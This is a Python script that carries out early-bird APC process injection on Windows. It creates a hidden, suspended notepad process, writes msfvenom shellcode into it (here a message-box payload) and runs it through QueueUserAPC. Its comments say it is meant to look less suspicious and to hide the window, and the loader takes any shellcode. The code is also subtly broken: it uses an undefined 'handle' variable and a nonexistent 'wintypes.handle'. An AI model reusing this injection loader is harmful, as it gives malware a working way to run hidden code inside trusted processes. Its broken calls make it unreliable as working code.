# Script for process creation and shellcode execution

# Importing the required modules
from ctypes import *
from ctypes import wintypes

# Adding constants and variables
kernel32 = windll.kernel32
SIZE_T = c_size_t
LPTSTR = POINTER(c_char)
LPBYTE = POINTER(c_ubyte)

# Defining the Functions
# VirtualAllocEx Function (Reserves, commits or changes the state of a region of memory within the virtual address space of a specified process)
VirtualAllocEx = kernel32.VirtualAllocEx
VirtualAllocEx.argtypes = (wintypes.HANDLE, wintypes.LPVOID, SIZE_T, wintypes.DWORD, wintypes.DWORD)
VirtualAllocEx.restype = wintypes.LPVOID

# VirtualProtectEx (Changes the protection of a region of committed pages in the virtual address space of a specified process)
VirtualProtectEx = kernel32.VirtualProtectEx
VirtualProtectEx.argtypes = (wintypes.HANDLE, wintypes.LPVOID, SIZE_T, wintypes.DWORD, wintypes.LPDWORD)
VirtualProtectEx.restype = wintypes.BOOL

# WriteProcessMemory Function (Writes data to an area of memoty in a specified process)
WriteProcessMemory = kernel32.WriteProcessMemory
WriteProcessMemory.argtypes = (wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID, SIZE_T, POINTER(SIZE_T))
WriteProcessMemory.restype = wintypes.BOOL

# CreateRemoteThread Function (Creates a thread that runs in the virtual address space of another process)
class _SECURITY_ATTRIBUTES(Structure):
    _fields_ = [('nLength', wintypes.DWORD),
                ('lpSecurityDescriptor', wintypes.LPVOID),
                ('bInheritHandle', wintypes.BOOL),]

SECURITY_ATTRIBUTES = _SECURITY_ATTRIBUTES
LPSECURITY_ATTRIBUTES = POINTER(_SECURITY_ATTRIBUTES)
LPTHREAD_START_ROUTINE = wintypes.LPVOID

CreateRemoteThread = kernel32.CreateRemoteThread
CreateRemoteThread.argtypes = (wintypes.HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, wintypes.LPVOID, wintypes.DWORD, wintypes.LPDWORD)
CreateRemoteThread.restype = wintypes.HANDLE

# Constants to work with memory
MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_READWRITE = 0x04
EXECUTE_IMMEDIATELY = 0x0
PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0x00000FFF)

# Creating process using win32 API
# CreateProcessA Function (Creates a new process and its primary thread)
class STARTUPINFO(Structure):
    _fields_ = [("cb", wintypes.DWORD),
                ("lpReserved", LPTSTR),
                ("lpDesktop", LPTSTR),
                ("lpTitle", LPTSTR),
                ("dwX", wintypes.DWORD),
                ("dwY", wintypes.DWORD),
                ("dwXSize", wintypes.DWORD),
                ("dwYSize", wintypes.DWORD),
                ("dwXCountChars", wintypes.DWORD),
                ("dwYCountChars", wintypes.DWORD),
                ("dwFileAttribute", wintypes.DWORD),
                ("dwFlags", wintypes.DWORD),
                ("wShowWindow", wintypes.WORD),
                ("cbReserved2", wintypes.WORD),
                ("lpReserved2", LPBYTE),
                ("hStdInput", wintypes.HANDLE),
                ("hStdOutput", wintypes.HANDLE),
                ("hStdError", wintypes.HANDLE),]

class PROCESS_INFORMATION(Structure): # Information useful for Injection
    _fields_ = [("hProcess", wintypes.HANDLE),
                ("hThread", wintypes.HANDLE),
                ("dwProcessId", wintypes.DWORD),
                ("dwThreadId", wintypes.DWORD),]

CreateProcessA = kernel32.CreateProcessA
CreateProcessA.argtypes = (wintypes.LPCSTR, wintypes.LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, wintypes.BOOL, wintypes.DWORD, wintypes.LPVOID, wintypes.LPCSTR, POINTER(STARTUPINFO), POINTER(PROCESS_INFORMATION))
CreateProcessA.restype = wintypes.BOOL

# Shell code using Message Box to display Hello World
# Created usign metasploit:- msfvenom -a x64 -p windows/x64/messagebox TITLE=hello TEXT=world -f py
buf =  b""
buf += b"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00"
buf += b"\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65"
buf += b"\x48\x8b\x52\x60\x3e\x48\x8b\x52\x18\x3e\x48\x8b"
buf += b"\x52\x20\x3e\x48\x8b\x72\x50\x3e\x48\x0f\xb7\x4a"
buf += b"\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02"
buf += b"\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52"
buf += b"\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
buf += b"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0"
buf += b"\x74\x6f\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44"
buf += b"\x8b\x40\x20\x49\x01\xd0\xe3\x5c\x48\xff\xc9\x3e"
buf += b"\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31"
buf += b"\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75"
buf += b"\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd6"
buf += b"\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
buf += b"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e"
buf += b"\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e"
buf += b"\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20"
buf += b"\x41\x52\xff\xe0\x58\x41\x59\x5a\x3e\x48\x8b\x12"
buf += b"\xe9\x49\xff\xff\xff\x5d\x49\xc7\xc1\x00\x00\x00"
buf += b"\x00\x3e\x48\x8d\x95\xfe\x00\x00\x00\x3e\x4c\x8d"
buf += b"\x85\x04\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
buf += b"\x56\x07\xff\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2"
buf += b"\x56\xff\xd5\x77\x6f\x72\x6c\x64\x00\x68\x65\x6c"
buf += b"\x6c\x6f\x00"

# Function for error checking
def verify(x):
    if not x:
        raise WinError()

# Creating Process to inject shell code
startup_info = STARTUPINFO()
startup_info.cb = sizeof(startup_info)
startup_info.dwFlags = 1
startup_info.wShowWindow = 1

process_info = PROCESS_INFORMATION()

CREATE_NEW_CONSOLE = 0x00000010
CREATE_NO_WINDOW = 0x08000000
CREATE_SUSPENDED = 0x00000004

# Creating a suspended and hidden (no window) process
created = CreateProcessA(b"C:\\Windows\\System32\\notepad.exe", None, None, None, False, CREATE_SUSPENDED | CREATE_NO_WINDOW, None, None, byref(startup_info), byref(process_info))

verify(created)

# Process Information
pid = process_info.dwProcessId
h_process = process_info.hProcess
thread_id = process_info.dwThreadId
h_thread = process_info.hThread

print("Started process => Handle:{}, PID:{}, TID:{}".format(h_process, pid, thread_id))

# Creating a less sucpicious read and write only memory
remote_memory = VirtualAllocEx(handle, False, len(buf), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
verify(remote_memory)
print("Memory Allocated => ", hex(remote_memory))

write = WriteProcessMemory(handle, remote_memory, buf, len(buf), None)
verify(write)
print("Bytes Written => ".format(len(buf)))

PAGE_EXECUTE_READ = 0x20
old_protection = wintypes.DWORD(0)

protect = VirtualProtectEx(h_process, remote_memory, len(buf), PAGE_EXECUTE_READ, byref(old_protection))
verify(protect)
print("Memeory protection updated from {} to {}".format(old_protection.value, PAGE_EXECUTE_READ))

# Using QueueUserAPC Function (Adds a user-mode asynchronous procedure call object to the APC queue of the specified thread)
PAPCFUNC = CFUNCTYPE(None, POINTER(wintypes.ULONG))

QueueUserAPC = kernel32.QueueUserAPC
QueueUserAPC.argtypes = (PAPCFUNC, wintypes.handle, POINTER(wintypes.ULONG))
QueueUserAPC.restype = wintypes.BOOL

# Using ResumeThread Function (Decrements a thread's suspend count. When the suspend count is decremented to zero the execution of the thread is resumed)
ResumeThread = kernel32.ResumeThread
ResumeThread.argtypes = (wintypes.HANDLE, )
ResumeThread.restype = wintypes.BOOL

rqueue = QueueUserAPC(PAPCFUNC(remote_memory), h_thread, None)
verify(rqueue)
print("Queueing APC Thread => {}".format(h_thread))

# Resume the Thread to execute the Procedure Call and then terminate itself
rthread = ResumeThread(h_thread)
verify(rthread)
print("Resuming Thread {}".format(thread_id))